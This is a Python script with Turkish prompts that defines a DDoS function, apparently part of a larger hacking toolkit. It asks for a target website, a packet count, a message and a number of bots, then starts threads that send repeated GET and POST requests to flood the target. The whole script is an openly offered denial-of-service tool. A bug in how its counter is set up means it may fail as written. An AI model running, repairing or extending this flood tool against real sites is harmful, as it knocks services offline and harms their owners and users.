from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor, wait
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from string import ascii_lowercase
from selenium import webdriver
from bs4 import BeautifulSoup
from os import system, sys
from scapy.all import *
from colorama import *
import threading
import requests
import random
import time
import os

def DDoS():
    def ttl():
        total = 0
    total = ttl()
    def urlfnk():
        nonlocal total
        target_url = input(Fore.RED+"Hedef WebSitesi:"+Fore.RESET+" ")
        packet_count = int(input(Fore.RED+"Gönderilecek Paket Sayısını Seçin (sonsuz ise 0 yazın):"+Fore.RESET+" "))
        msg = input(Fore.RED+"Mesajınızı giriniz:"+Fore.RESET+" ")
        threadnum = int(input(Fore.RED+"Bot Sayısı:"+Fore.RESET+" "))

        def send_request():
            nonlocal total
            while True:
                try:
                    response = requests.get(target_url)
                    requests.post(target_url, data={"message": msg})
                    total += 1
                    print(Fore.GREEN + f"{total}. Paket {msg} Mesajı İle Başarı İle Gönderildi!")
                except requests.exceptions.RequestException as e:
                    total += 1
                    print(Fore.RED + f"{total}. Paket Gönderilemedi!")
                if packet_count != 0 and total >= packet_count:
                    break

        if packet_count != 0:
            threads = []
            for _ in range(packet_count):
                thread = threading.Thread(target=send_request)
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()
            print(Fore.GREEN + f"\nToplam gönderilen paket sayısı: {total}")
        else:
            number_of_threads = threadnum
            threads = []

            for i in range(number_of_threads):
                thread = threading.Thread(target=send_request)
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()
    urlfnk()
